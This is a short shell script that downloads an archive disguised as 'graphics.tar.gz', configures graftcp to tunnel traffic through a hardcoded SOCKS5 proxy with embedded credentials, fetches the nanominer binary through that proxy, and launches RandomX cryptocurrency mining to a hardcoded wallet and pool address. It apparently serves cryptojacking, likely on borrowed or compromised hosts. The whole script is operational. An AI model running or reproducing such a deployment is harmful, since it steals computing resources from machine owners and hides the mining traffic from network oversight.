#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 31.171.241.147:443

socks5_username = temera88

socks5_password = temera88

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2
./graftcp/graftcp wget https://github.com/nanopool/nanominer/releases/download/v3.8.5/nanominer-linux-3.8.5.tar.gz && tar -xvf nanominer-linux-3.8.5.tar.gz 
chmod 7777 *  
./graftcp/graftcp ./nanominer -algo randomx -wallet 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE -rigName NANO_08 -pool1 34.149.22.228:9200
